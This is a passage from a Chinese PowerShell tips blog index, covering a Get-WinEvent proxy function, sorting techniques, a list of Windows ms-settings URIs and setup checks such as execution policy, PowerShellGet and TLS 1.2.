[Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='FileSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [switch] ${Oldest}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [datetime] ${After}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [datetime] ${Before}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [string[]] ${UserName}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog', Position=1)] [ValidateRange(0, 9223372036854775807)] [ValidateNotNullOrEmpty()] [long[]] ${InstanceId}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [ValidateRange(1, 2147483647)] [int[]] ${Index}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [Alias('ET')] [ValidateNotNullOrEmpty()] [ValidateSet('Error','Information','FailureAudit','SuccessAudit','Warning')] [string[]] ${EntryType}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [Alias('ABO')] [ValidateNotNullOrEmpty()] [string[]] ${Source}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [Alias('MSG')] [ValidateNotNullOrEmpty()] [string] ${Message}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [switch] ${AsBaseObject}, [Parameter(ParameterSetName='ListGetEventlog')] [switch] ${List}, [Parameter(ParameterSetName='ListGetEventlog')] [switch] ${AsString} ) begin { try { $outBuffer = $null if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer)) { $PSBoundParameters['OutBuffer'] = 1 } $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Diagnostics\\Get-WinEvent', [System.Management.Automation.CommandTypes]::Cmdlet) \\# if the user chose the Get-EventLog compatible parameters, \\# compose the appropriate filter hash table $scriptCmd = if ($PSCmdlet.ParameterSetName -eq 'LogNameGetEventlog') { \\# mandatory parameter $filter = @{ LogName = $PSBoundParameters['Logname'] } $null = $PSBoundParameters.Remove('LogName') if ($PSBoundParameters.ContainsKey('Before')) { $filter['EndTime'] = $PSBoundParameters['Before'] $null = $PSBoundParameters.Remove('Before') } if ($PSBoundParameters.ContainsKey('After')) { $filter['StartTime'] = $PSBoundParameters['After'] $null = $PSBoundParameters.Remove('After') } if ($PSBoundParameters.ContainsKey('EntryType')) { \\# severity is translated to an integer array $levelFlags = [System.Collections.Generic.List[int]]@() \\# string input converted to integer array if ($PSBoundParameters['EntryType'] -contains 'Error') { $levelFlags.Add(1) \\# critical $levelFlags.Add(2) \\# error } if ($PSBoundParameters['EntryType'] -contains 'Warning') { $levelFlags.Add(3) \\# warning } if ($PSBoundParameters['EntryType'] -contains 'Information') { $levelFlags.Add(4) \\# informational $levelFlags.Add(5) \\# verbose } \\# default to 0 if ($levelFlags.Count -gt 0) { $filter['Level'] = [int[]]$levelFlags } \\# audit settings stored in Keywords key if ($PSBoundParameters['EntryType'] -contains 'FailureAudit') { $filter['Keywords'] += 0x10000000000000 } if ($PSBoundParameters['EntryType'] -contains 'SuccessAudit') { $filter['Keywords'] += 0x20000000000000 } $null = $PSBoundParameters.Remove('EntryType') } if ($PSBoundParameters.ContainsKey('InstanceId')) { $filter['ID'] = $PSBoundParameters['InstanceId'] $null = $PSBoundParameters.Remove('InstanceId') } if ($PSBoundParameters.ContainsKey('Source')) { $filter['ProviderName'] = $PSBoundParameters['Source'] $null = $PSBoundParameters.Remove('Source') } $PSBoundParameters['FilterHashtable'] = $filter Write-Host ($filter | Out-String) -ForegroundColor Green if ($PSBoundParameters.ContainsKey('Newest')) { $PSBoundParameters['MaxEvents'] = $PSBoundParameters['Newest'] $null = $PSBoundParameters.Remove('Newest') } } $scriptCmd = { &amp; $wrappedCmd @PSBoundParameters } $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin) $steppablePipeline.Begin($PSCmdlet) } catch { throw } } process { try { $steppablePipeline.Process($_) } catch { throw } } end { try { $steppablePipeline.End() } catch { throw } } &lt;# .ForwardHelpTargetName Microsoft.PowerShell.Diagnostics\\Get-WinEvent .ForwardHelpCategory Cmdlet \\#&gt;} 当您执行完这个函数，就可以通过您在 Get-EventLog 中熟悉的相同参数使用 Get-WinEvent： 123456PS&gt; Get-WinEvent -LogName System -EntryType Error,Warning -Newest 10Name Value---- -----LogName {System}Level {1, 2, 3} 您还可以获得基于参数使用的哈希表过滤器的键和值。","link":"/2021/10/22/working-with-get-winevent/"},{"title":"PowerShell 技能连载 - 读取文本文件（快速）","text":"如果您需要加载大文本文件并使用 Get-Content，那么您可以节省大量时间。 如果您没有立即通过管道处理通过管道发出的结果，则可能需要添加参数 -ReadCount 0。这可以使读取文本文件的速度提升 100 倍。 如果没有此参数，Get-Content 会单独对每个文本行产生一次输出。如果这些行要传递给管道处理，那么没有问题。但是如果要将文本存储在变量中并使用其他处理方式，则这是浪费时间，例如经典的 foreach 循环。","link":"/2021/10/26/loading-text-files-fast/"},{"title":"PowerShell 技能连载 - 速度很重要","text":"PowerShell 是一种通用自动化语言，因此它的目标是多功能且易于使用。速度不是首要任务。 如果您确实关心最大速度，那么有一些 cmdlet 几乎可以完全满足 .NET 调用的功能。在这些实例中使用直接 .NET 调用会更快，尤其是在经常调用这些 cmdlet 时（例如在循环中）。但另一方面是它使您的代码更难阅读。 这里有一些例子： 123456789101112131415161718# cmdletPS&gt; Join-Path -Path $env:temp -ChildPath test.txtC:\\Users\\tobia\\AppData\\Local\\Temp\\test.txt# direct .NETPS&gt; [System.IO.Path]::Combine($env:temp, 'test.txt')C:\\Users\\tobia\\AppData\\Local\\Temp\\test.txt# cmdletPS&gt; Get-DateMonday, October 4, 2021 12:34:46# direct .NETPS&gt; [DateTime]::NowMonday, October 4, 2021 12:34:52","link":"/2021/10/28/when-speed-matters/"},{"title":"PowerShell 技能连载 - 高级排序（第 1 部分）","text":"Sort-Object easily sorts results for you. For primitive data such as numbers or strings, simply add Sort-Object to your pipeline. This gets you a sorted list of lottery numbers:Sort-Object 能轻松对结果排序。对于数字或字符串等原始数据，只需将 Sort-Object 添加到您的管道中。这将为您提供一个排序的彩票号码列表： 1234$lottery = 1..49 | Get-Random -Count 7 | Sort-Object# set the string you want to use to separate numbers in your output$ofs = ','&quot;Your numbers are $lottery&quot; 具有多个属性的对象数据要求您定义要排序的属性。此行代码按状态对服务进行排序： 1Get-Service | Sort-Object -Property Status Sort-Object 甚至支持多种排序。此行代码按状态对服务进行排序，然后按服务名称排序： 1Get-Service | Sort-Object -Property Status, DisplayName | Select-Object -Property DisplayName, Status 要反转排序顺序，请添加 -Descending 开关参数。 有关排序的更多控制，例如，对一个属性升序排序和另一个属性降序排序，请参阅我们的下一个提示。","link":"/2021/11/01/advanced-sorting-part-1/"},{"title":"PowerShell 技能连载 - 高级排序（第 2 部分）","text":"Sort-Object 支持高级排序，并在您传入哈希表时提供更多控制。例如，哈希表可以单独控制多个属性的排序方向。 例如，此行代码按状态对服务进行排序，然后按名称排序。排序方向可以通过 -Descending 开关参数控制，但始终适用于所有选定的属性： 123Get-Service | Sort-Object -Property Status, DisplayName | Select-Object -Property DisplayName, StatusGet-Service | Sort-Object -Property Status, DisplayName -Descending | Select-Object -Property DisplayName, Status 要单独控制排序方向，请传入哈希表并使用 Expression 和 Descending 键。这首先按状态（降序）对服务进行排序，然后按显示名称（升序）： 123Get-Service |Sort-Object -Property @{Expression='Status'; Descending=$true}, @{Expression='DisplayName'; Descending=$false } |Select-Object -Property DisplayName, Status 注意：当您查看结果时，您可能会对“状态”属性的内容排序方式感到恼火。尽管代码要求降序排序，但您首先会看到正在运行的服务，然后是停止的服务。 这个问题的简单答案是：您现在知道如何单独控制排序，因此如果排序顺序错误，只需尝试颠倒排序顺序，看看是否适合您。 深入的答案是：”Status“ 属性实际上是一个数字常量，而 Sort-Object 始终对底层数据进行排序。因此，当您使数字常量可见时，会发现排序顺序是正确的： 123Get-Service |Sort-Object -Property @{Expression='Status'; Descending=$true}, @{Expression='DisplayName'; Descending=$false } |Select-Object -Property DisplayName, { [int]$_.Status } 正如您现在所看到的，”Running“ 实际上是常量 “4”，而 “Stopped” 由常量 1 表示。 不要错过我们的下一个技能，以获得更多控制（以及对由底层数字常量引起的问题的优雅修复）。","link":"/2021/11/03/advanced-sorting-part-2/"},{"title":"PowerShell 技能连载 - 高级排序（第 3 部分）","text":"在上一个提示中，您已经看到 Sort-Object 如何接受哈希表作为参数，对排序进行高级控制。 例如，此行代码按状态排序，然后显示名称，并为每个属性使用单独的排序方向： 123Get-Service |Sort-Object -Property @{Expression='Status'; Descending=$true}, @{Expression='DisplayName'; Descending=$false } |Select-Object -Property DisplayName, Status 但是，当您查看结果时，”Status” 属性的排序方向似乎是错的。我们已经澄清了这一点，因为 “Status” 实质上是一个数字常量，而 Sort-Object 排序的底层逻辑是对原始数据进行排序。所以它是根据内部的数值型常量对 “Status” 进行排序，而不是根据可见的友好名称。 要确保 Sort-Object 是按照用户“看见”对象的内容对它们排序，请使用哈希表的另一个功能：”Expression” 键不仅能接受属性的名称，而且用支持脚本块（代码）转换为任何数据，再对该数据排序。在脚本块内，$_ 表示完整的传入对象。 要确保 “Status” 根据文本来排序而不是根据背后的数值来排序，请将其转换为字符串，如下所示： 123Get-Service |Sort-Object -Property @{Expression={[string]$_.Status}; Descending=$true}, @{Expression='DisplayName'; Descending=$false } |Select-Object -Property DisplayName, Status 事实上，在排序之前改变数据的能力，能改变所有排序的游戏规则。 假设您有一个 HTTPS 连接列表，用于保存浏览器连接到的远程 IP 地址，并且您正在尝试通过 Sort-Object 来对这些 IP 地址进行排序： 1234567891011121314PS C:\\&gt; Get-NetTCPConnection -RemotePort 443 | Select-Object -Property RemoteAddress, RemotePort, State, OwningProcess | Sort-Object -Property RemoteAddressRemoteAddress RemotePort State OwningProcess------------- ---------- ----- -------------142.250.185.74 443 TimeWait 0142.250.186.46 443 TimeWait 020.199.120.182 443 Established 355220.199.120.182 443 Established 556420.42.65.89 443 Established 983620.42.65.89 443 TimeWait 020.42.73.24 443 TimeWait 035.186.224.25 443 TimeWait 045.60.13.212 443 Established 764451.104.30.131 443 Established 10220 如果您将仔细查看结果，您将看到 “RemoteAddress” 未正确排序：例如 “20.199.120.182” 列在了 “20.42.65.89” 的前面。 这是因为这些 IPv4 地址被视为字符串，因此 Sort-Object 使用默认的字母数字排序算法。 您现在知道如何以更合适的数据类型转换数据。例如，IPv4 地址可以被视为软件版本（数据类型[版本]）正确排序： 12345678910111213PS&gt; Get-NetTCPConnection -RemotePort 443 | Select-Object -Property RemoteAddress, RemotePort, State, OwningProcess | Sort-Object -Property @{Expression={ $_.RemoteAddress -as [version] }}RemoteAddress RemotePort State OwningProcess------------- ---------- ----- -------------20.42.65.89 443 Established 983620.42.65.89 443 TimeWait 020.199.120.182 443 Established 355220.199.120.182 443 Established 556435.186.224.25 443 TimeWait 045.60.13.212 443 Established 764451.104.30.131 443 Established 10220142.250.185.74 443 TimeWait 0142.250.186.46 443 TimeWait 0 现在 IP 地址已可以正确排序。 注意：当将数据转换为其他数据类型（如此处所示）时，始终优先使用 -as 运算符进行直接类型转换。如果数据不能转换为所需的数据类型，则 -as 运算符只会返回 $null，而直接类型转换将会产生异常。 在前面的例子中，如果 “RemoteAddress” 会显示一个 IPv6 地址（不能转换为 [version]），幸亏 -as 操作符，这些项目不会被排序，而会放在排序数据的开头. 要缩短代码，您可以简写哈希表的键（只要它们保持唯一）： 123Get-NetTCPConnection -RemotePort 443 |Select-Object -Property RemoteAddress, RemotePort, State, OwningProcess |Sort-Object -Property @{E={ $_.RemoteAddress -as [version] }} 如果您需要的只是数据转换，则可以完全跳过哈希表并将脚本块直接传给 -Property 参数： 12345678910111213PS&gt; Get-NetTCPConnection -RemotePort 443 | Select-Object -Property RemoteAddress, RemotePort, State, OwningProcess | Sort-Object -Property { $_.RemoteAddress -as [version] }RemoteAddress RemotePort State OwningProcess------------- ---------- ----- -------------20.42.65.89 443 Established 983620.42.65.89 443 TimeWait 020.199.120.182 443 Established 355220.199.120.182 443 Established 556435.186.224.25 443 TimeWait 045.60.13.212 443 Established 764451.104.30.131 443 Established 10220142.250.185.74 443 TimeWait 0142.250.186.46 443 TimeWait 0","link":"/2021/11/05/advanced-sorting-part-3/"},{"title":"PowerShell 技能连载 - 高级排序（第 4 部分）","text":"在上一个部分中，我们说明了如何使用脚本块对排序进行更多的控制。例如，您可以使用 “-as“ 运算符来转换数据以控制排序算法。 这样，您可以“修正”传入数据的数据类型。例如将某些或所有数字数据转为字符串类型，再传给 Sort-Object。看看第一个例子的结果，以及下方的修正结果： 1234567891011121314151617PS&gt; 1,2,&quot;13&quot;,4,11,3,&quot;2&quot; | Sort-Object113234112PS&gt; 1,2,&quot;13&quot;,4,11,3,&quot;2&quot; | Sort-Object -Property { $_ -as [double] }122341113 同样，您可以完全随机化列表，快速地创建简单的随机密码： 12345PS&gt; -join ('abcdefghkmnrstuvwxyz23456789*+#'.ToCharArray() | Get-Random -count 5 | Sort-Object -Property { Get-Random } )m2v6uPS&gt; -join ('abcdefghkmnrstuvwxyz23456789*+#'.ToCharArray() | Get-Random -count 5 | Sort-Object -Property { Get-Random } )b+g7t 或者，您可以根据计算值进行排序。下面的示例按文件年龄排序，通过从创建时间中减去上次写入时间计算得出： 123Get-ChildItem -Path c:\\windows -Filter *.log -Depth 1 -ErrorAction Ignore |Sort-Object -Property { $_.LastWriteTime - $_.CreationTime } |Select-Object -Property Name, LastWriteTime, CreationTime, @{Name='Age (Days)';Expression={ [int]($_.LastWriteTime - $_.CreationTime).TotalDays }} 结果看起来类似这样： Name LastWriteTime CreationTime Age (Days) ---- ------------- ------------ ---------- setupapi.upgrade.log 28.09.2020 15:04:56 28.09.2020 15:40:12 0 setuperr.log 11.07.2021 14:37:51 11.07.2021 14:37:51 0 setupact.log 16.10.2021 12:59:17 16.10.2021 12:59:17 0 setupapi.setup.log 28.09.2020 17:48:22 28.09.2020 17:47:36 0 setupapi.offline.20191207_091437.log 07.12.2019 10:14:37 07.12.2019 10:13:02 0 setupapi.offline.log 28.09.2020 15:40:12 28.09.2020 15:09:47 0 setupapi.dev.20201120_180252.log 20.11.2020 18:02:52 28.09.2020 17:51:43 53 setupapi.dev.20210514_095516.log 14.05.2021 09:55:16 27.02.2021 04:17:58 76 setupapi.dev.20210226_041725.log 26.02.2021 04:17:25 22.11.2020 04:18:58 96 lvcoinst.log 23.10.2021 15:30:45 19.07.2021 08:46:48 96 PFRO.log 25.10.2021 13:54:27 11.07.2021 14:41:28 106 WindowsUpdate.log 26.10.2021 10:47:38 10.07.2021 15:05:05 108 setupapi.dev.20210710_201855.log 10.07.2021 20:18:55 27.02.2021 04:17:58 134 setupapi.dev.20210915_082529.log 15.09.2021 08:25:29 27.02.2021 04:17:58 200 NetSetup.LOG 17.04.2020 15:19:26 26.08.2019 17:23:11 235 setupapi.dev.log 26.10.2021 06:27:25 27.02.2021 04:17:58 241 mrt.log 13.10.2021 08:30:39 12.11.2020 07:16:17 335 PASSWD.LOG 25.10.2021 13:54:28 28.09.2020 17:47:22 392 ReportingEvents.log 26.10.2021 09:37:23 03.09.2019 10:42:58 784 Gms.log 25.10.2021 13:54:32 26.08.2019 17:27:50 791 请注意如何以非常相似的方式将哈希表与 Select-Object 一起使用。在示例中，通过将哈希表提交给 Select-Object，将“Age (Days)”属性添加到输出中。在内部，哈希表定义了新属性的名称并提供了一个脚本块来计算属性值。此脚本块的工作原理与此处讨论的脚本块基本相同：$_ 表示整个对象，您可以使用任何 PowerShell 表达式来转换或计算该值。","link":"/2021/11/09/advanced-sorting-part-4/"},{"title":"PowerShell 技能连载 - 打开 Windows 设置对话框（快速）（第 1 部分）","text":"大多数对话框和 Windows 中的设置可以通过内部命令直接打开。Windows 10 的设置对话框可以用如下命令打开： 1PS&gt; Start-Process ms-settings: 要打开特定的设置页面，请添加其名称。例如，要快速打开“镜像显示”设置页面，请尝试如下代码： 1PS&gt; Start-Process ms-settings:quietmomentspresentation 以下是 Paolo Maffezzoli 整理的支持命令列表（谢谢）： Page Command (URI) **Settings home page** Settings home page ms-settings: **System** Display ms-settings:display Night light settings ms-settings:nightlight Advanced scaling settings ms-settings:display-advanced Connect to a wireless display ms-settings-connectabledevices:devicediscovery Graphics settings ms-settings:display-advancedgraphics Display orientation ms-settings:screenrotation Sound (build 17063+) ms-settings:sound Manage sound devices ms-settings:sound-devices App volume and device preferences ms-settings:apps-volume Notifications & actions ms-settings:notifications Focus assist (build 17074+) ms-settings:quiethours, OR ms-settings:quietmomentshome During these hours ms-settings:quietmomentsscheduled Duplicating my display (When I'm duplicating my display) ms-settings:quietmomentspresentation Playing a game full screen (When I'm playing a game) ms-settings:quietmomentsgame Power & sleep ms-settings:powersleep Battery ms-settings:batterysaver See which apps are affecting your battery life ms-settings:batterysaver-usagedetails Battery Saver settings ms-settings:batterysaver-settings Storage ms-settings:storagesense Configure Storage Sense or run it now ms-settings:storagepolicies Change where new content is saved ms-settings:savelocations Tablet mode ms-settings:tabletmode Multitasking ms-settings:multitasking Projecting to this PC ms-settings:project Shared experiences ms-settings:crossdevice Clipboard ms-settings:clipboard Remote Desktop ms-settings:remotedesktop Device Encryption (where available) ms-settings:deviceencryption About ms-settings:about **Devices** Bluetooth & other devices ms-settings:bluetooth, OR ms-settings:connecteddevices Printers & scanners ms-settings:printers Mouse ms-settings:mousetouchpad Touchpad ms-settings:devices-touchpad Typing ms-settings:typing Hardware keyboard - Text suggestions ms-settings:devicestyping-hwkbtextsuggestions Wheel (where available) ms-settings:wheel Pen & Windows Ink ms-settings:pen AutoPlay ms-settings:autoplay USB ms-settings:usb **Phone** Phone ms-settings:mobile-devices Add a phone ms-settings:mobile-devices-addphone Your Phone (opens app) ms-settings:mobile-devices-addphone-direct **Network & Internet** Network & Internet ms-settings:network Status ms-settings:network-status Show available networks ms-availablenetworks: Cellular & SIM ms-settings:network-cellular Wi-Fi ms-settings:network-wifi Show available networks ms-availablenetworks: Manage known networks ms-settings:network-wifisettings Wi-Fi Calling ms-settings:network-wificalling Ethernet ms-settings:network-ethernet Dial-up ms-settings:network-dialup DirectAccess (where available) ms-settings:network-directaccess VPN ms-settings:network-vpn Airplane mode ms-settings:network-airplanemode, OR ms-settings:proximity Mobile hotspot ms-settings:network-mobilehotspot NFC ms-settings:nfctransactions Data usage ms-settings:datausage Proxy ms-settings:network-proxy **Personalization** Personalization ms-settings:personalization Background ms-settings:personalization-background Colors ms-settings:personalization-colors, OR ms-settings:colors Lock screen ms-settings:lockscreen Themes ms-settings:themes Fonts (build 17083+) ms-settings:fonts Start ms-settings:personalization-start Choose which folders appear on Start ms-settings:personalization-start-places Taskbar ms-settings:taskbar **Apps** Apps & features ms-settings:appsfeatures OR ms-settings:appsfeatures-app Manage optional features ms-settings:optionalfeatures Default apps ms-settings:defaultapps Offline maps ms-settings:maps Download maps ms-settings:maps-downloadmaps Apps for websites ms-settings:appsforwebsites Video playback (build 16215+) ms-settings:videoplayback Startup (build 17017+) ms-settings:startupapps **Accounts** Your info ms-settings:yourinfo Email & accounts ms-settings:emailandaccounts Sign-in options ms-settings:signinoptions Windows Hello face setup ms-settings:signinoptions-launchfaceenrollment Windows Hello fingerprint setup ms-settings:signinoptions-launchfingerprintenrollment Security Key setup ms-settings:signinoptions-launchsecuritykeyenrollment Dynamic Lock ms-settings:signinoptions-dynamiclock Access work or school ms-settings:workplace Family & other people ms-settings:otherusers OR ms-settings:family-group Set up a kiosk ms-settings:assignedaccess Sync your settings ms-settings:sync **Time & language** Date & time ms-settings:dateandtime Region ms-settings:regionformatting Japan IME settings (where available) ms-settings:regionlanguage-jpnime Pinyin IME settings (where available) ms-settings:regionlanguage-chsime-pinyin Wubi IME settings (where available) ms-settings:regionlanguage-chsime-wubi Korea IME settings (where available) ms-settings:regionlanguage-korime Language ms-settings:regionlanguage OR ms-settings:regionlanguage-languageoptions Windows Display language ms-settings:regionlanguage-setdisplaylanguage Add Display language ms-settings:regionlanguage-adddisplaylanguage Keyboard (removed in build 17083+) ms-settings:keyboard Speech ms-settings:speech **Gaming** Game bar ms-settings:gaming-gamebar Captures ms-settings:gaming-gamedvr Broadcasting ms-settings:gaming-broadcasting Game Mode ms-settings:gaming-gamemode TruePlay (removed in version 1809+) ms-settings:gaming-trueplay Xbox Networking (build 16226+) ms-settings:gaming-xboxnetworking **Extras** Extras (available when Settings app extensions installed) ms-settings:extras **Ease of Access** Display (build 17025+) ms-settings:easeofaccess-display Mouse Pointer (Cursor & pointer, build 17040+) ms-settings:easeofaccess-cursorandpointersize OR ms-settings:easeofaccess-MousePointer Text Cursor ms-settings:easeofaccess-cursor Magnifier ms-settings:easeofaccess-magnifier Color Filters (build 17025+) ms-settings:easeofaccess-colorfilter Adaptive Color Filters Link ms-settings:easeofaccess-colorfilter-adaptivecolorlink Night Light Link ms-settings:easeofaccess-colorfilter-bluelightlink High Contrast ms-settings:easeofaccess-highcontrast Narrator ms-settings:easeofaccess-narrator Start Narratorafter sign-in for me ms-settings:easeofaccess-narrator-isautostartenabled Audio (build 17035+) ms-settings:easeofaccess-audio Closed captions ms-settings:easeofaccess-closedcaptioning Speech (build 17035+) ms-settings:easeofaccess-speechrecognition Keyboard ms-settings:easeofaccess-keyboard Mouse ms-settings:easeofaccess-mouse Eye Control (build 17035+) ms-settings:easeofaccess-eyecontrol Other options (removed in version 1809+) ms-settings:easeofaccess-otheroptions **Search (version 1903+)** Permissions & history ms-settings:search-permissions Searching Windows ms-settings:cortana-windowssearch More details ms-settings:search-moredetails **Cortana (build 16188+)** Cortana ms-settings:cortana Talk to Cortana ms-settings:cortana-talktocortana Permissions ms-settings:cortana-permissions More details ms-settings:cortana-moredetails **Privacy** General ms-settings:privacy Speech ms-settings:privacy-speech Inking & typing personalization ms-settings:privacy-speechtyping Diagnostics & feedback ms-settings:privacy-feedback View Diagnostic Data ms-settings:privacy-feedback-telemetryviewergroup Activity history (build 17040+) ms-settings:privacy-activityhistory Location ms-settings:privacy-location Camera ms-settings:privacy-webcam Microphone ms-settings:privacy-microphone Voice activation ms-settings:privacy-voiceactivation Notifications ms-settings:privacy-notifications Account info ms-settings:privacy-accountinfo Contacts ms-settings:privacy-contacts Calendar ms-settings:privacy-calendar Phone calls (removed in version 1809+) ms-settings:privacy-phonecalls Call history ms-settings:privacy-callhistory Email ms-settings:privacy-email Eye tracker (requires eyetracker hardware) ms-settings:privacy-eyetracker Tasks ms-settings:privacy-tasks Messaging ms-settings:privacy-messaging Radios ms-settings:privacy-radios Other devices ms-settings:privacy-customdevices Background apps ms-settings:privacy-backgroundapps App diagnostics ms-settings:privacy-appdiagnostics Automatic file downloads ms-settings:privacy-automaticfiledownloads Documents ms-settings:privacy-documents Pictures ms-settings:privacy-pictures Videos ms-settings:privacy-documents File system ms-settings:privacy-broadfilesystemaccess **Update & security** Windows Update ms-settings:windowsupdate Check for updates ms-settings:windowsupdate-action View update history ms-settings:windowsupdate-history Restart options ms-settings:windowsupdate-restartoptions Advanced options ms-settings:windowsupdate-options Change active hours ms-settings:windowsupdate-activehours Optional updates ms-settings:windowsupdate-optionalupdates OR ms-settings:windowsupdate-seekerondemand Delivery Optimization ms-settings:delivery-optimization Windows Security / Windows Defender ms-settings:windowsdefender Open Windows Security windowsdefender: Backup ms-settings:backup Troubleshoot ms-settings:troubleshoot Recovery ms-settings:recovery Activation ms-settings:activation Find My Device ms-settings:findmydevice For developers ms-settings:developers Windows Insider Program ms-settings:windowsinsider, OR ms-settings:windowsinsider-optin **Mixed reality** Mixed reality ms-settings:holographic Audio and speech ms-settings:holographic-audio Environment ms-settings:privacy-holographic-environment Headset display ms-settings:holographic-headset Uninstall ms-settings:holographic-management **Surface Hub** Accounts ms-settings:surfacehub-accounts Team Conferencing ms-settings:surfacehub-calling Team device management ms-settings:surfacehub-devicemanagenent Session cleanup ms-settings:surfacehub-sessioncleanup Welcome screen ms-settings:surfacehub-welcome","link":"/2021/11/11/opening-windows-settings-dialogs-fast/"},{"title":"PowerShell 技能连载 - 打开 Windows 设置对话框（快速）（第 2 部分）","text":"上一个技能中，我们介绍了 Start-Process 支持的命令 “ms-settings:“，可用于打开各种 Windows 设置对话框。例如，要打开个人注册信息页面，请执行以下操作： 1PS&gt; Start-Process ms-settings:yourinfo 每当您需要经常打开特定对话框时，例如检查更新，那么现在可以直接做到： 1PS&gt; Start-Process ms-settings:windowsupdate-action 但是，您需要记住相当隐蔽的命令。您无法定义新的命令别名，因为这些代码不是命令，而是命令加参数。 但是，您可以为此做些什么，也就是创建简单的函数。当您需要方便地记忆命令和参数时，这一直是一种好方法： 1function update { Start-Process ms-settings:windowsupdate-action } 运行此代码后，您现在可以使用新的 “update“ 命令快速检查 Windows 更新。如果要保留这些功能，请将它们导出为一个 module，或将功能代码放入其中一个配置文件（自动启动）脚本中。 可以在 $profile 中找到默认配置文件脚本的路径。如果尚不存在，您可能必须创建文件。如果还没有允许脚本执行，请先启用它。","link":"/2021/11/15/opening-windows-settings-dialogs-fast-part-2/"},{"title":"PowerShell 技能连载 - 改进 PowerShell ISE 的帮助","text":"仍有许多专业的脚本编写者使用内置 PowerShell ISE 编辑器，它仍然是一个快速可靠的脚本开发环境。如果您使用 PowerShell ISE，可能希望将它内置的帮助系统切换为在线帮助。请运行这段代码（在 PowerShell ISE 中）： 1PS&gt; $psise.Options.UseLocalHelp = $false 运行此代码后，只要您在脚本窗格或控制台部分中单击命令，然后按 F1，PowerShell ISE 将对命令运行 Get-Help 并添加 -Online 开关参数，因此浏览器打开并显示复杂的、排版好的最新在线帮助。 尽管如此，您可能希望记住上面的命令：如果命令没有在线帮助，则可能仍有本地帮助文件。将 PowerShell ISE 选项恢复为 $true 将打开本地帮助。","link":"/2021/11/17/better-help-in-powershell-ise/"},{"title":"PowerShell 技能连载 - 四个 PowerShell 关键先决条件","text":"如果您要切换到新计算机，您可能需要快速检查一下 PowerShell 是否设置正确。以下是您绝对应该检查的四件事： 1 检查 PowerShell 版本运行 $PSVersionTable 以检查您的 PowerShell 版本。 123456789101112PS&gt; $PSVersionTableName Value---- -----PSVersion 5.1.19041.1237PSEdition DesktopPSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}BuildVersion 10.0.19041.1237CLRVersion 4.0.30319.42000WSManStackVersion 3.0PSRemotingProtocolVersion 2.3SerializationVersion 1.1.0.1 由于 $PSVersionTable 是一个哈希表，您还可以将其转换为对象以选择某些属性： 12345PS&gt; [PSCustomObject]$PSVersionTable | Select-Object -Property PSVersion, PSEditionPSVersion PSEdition--------- ---------5.1.19041.1237 Desktop 如果 “PSEdition“ 是 “Desktop“，则您使用的是内置的 Windows PowerShell。应该是 5.1 版。任何旧版本均已弃用，使用旧版本可能会引发安全风险。由于 Windows PowerShell 功能齐全，因此没有超过 5.1 的新版本。 如果 “PSEdition“ 是 “Core“，那么您使用的是新的跨平台 PowerShell。当前版本为 7.1.5，更新频繁。 2 检查运行策略如果你不能运行脚本，PowerShell 就没有意义了。执行策略应设置为 “RemoteSigned“（仅允许本地脚本）或 “Bypass“（位于任何地方的脚本都可以运行，包括下载的脚本）： 12PS&gt; Get-ExecutionPolicyBypass 如果需要，使用以下代码来更改执行策略： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force 3 检查 PowerShellGetPowerShellGet 是一个重要的附加组件，因为它代表了 PowerShell 包管理。使用 PowerShellGet，您可以通过 Install-Module 安装其他模块。如果此模块已过时，您可能无法再下载和安装其他模块： 12345PS&gt; Get-Module -Name PowerShellGet -ListAvailable | Sort-Object -Property Version -Descending | Select-Object -First 1 -Property VersionVersion-------2.2.5 如果报告的版本低于 2.2.0，则需要更新此模块。如果您看到版本 1.0.0 或 1.0.1（最初随 Windows 一起提供并且此后从未更新过的初始模块），则尤其如此。 要更新该模块，您需要重新安装它及其必备的 PackageManagement 模块： 12Install-Module -Name PowerShellGet -Scope CurrentUser -Force -AllowClobberInstall-Module -Name Packagemanagement -Scope CurrentUser -Force -AllowClobber TLS 1.2 支持最后要检查的是 Windows 是否设置为支持传输层协议 1.2： 12PS&gt; ([System.Net.ServicePointManager]::SecurityProtocol -band 'Tls12') -eq 'Tls12'True If this is $false, then your Windows still uses outdated settings, and PowerShell may not be able to connect to HTTPS: webservices and sites. You should update Windows. Meanwhile, you can manually enable TLS 1.2 on a per-application setting:如果返回 $false，那么您的 Windows 仍然使用过时的设置，并且 PowerShell 可能无法连接到 HTTPS：网络服务和网站。您应该更新 Windows。同时，您可以在每个应用程序独立的设置上手动启用 TLS 1.2： 123[System.Net.ServicePointManager]::SecurityProtocol =[System.Net.ServicePointManager]::SecurityProtocol -bor[System.Net.SecurityProtocolType]::Tls12","link":"/2021/11/19/four-powershell-critical-prerequisites/"},{"title":"PowerShell 技能连载 - 启用 Active Directory cmdlet","text":"在服务器和客户端上，Windows 都附带了 “ActiveDirectory” PowerShell 模块。它添加了许多 cmdlet 来管理 Active Directory 中的用户和资源。 默认情况下，该模块是隐藏的。要在客户端上启用它，请以管理员权限运行： 12$element = Get-WindowsCapability -Online -Name &quot;Rsat.ActiveDirectory.DS*&quot;Add-WindowsCapability -Name $element.Name -Online 在服务器上，再次使用管理员权限并运行： 12Install-WindowsFeature RSAT-AD-PowerShellAdd-WindowsFeature 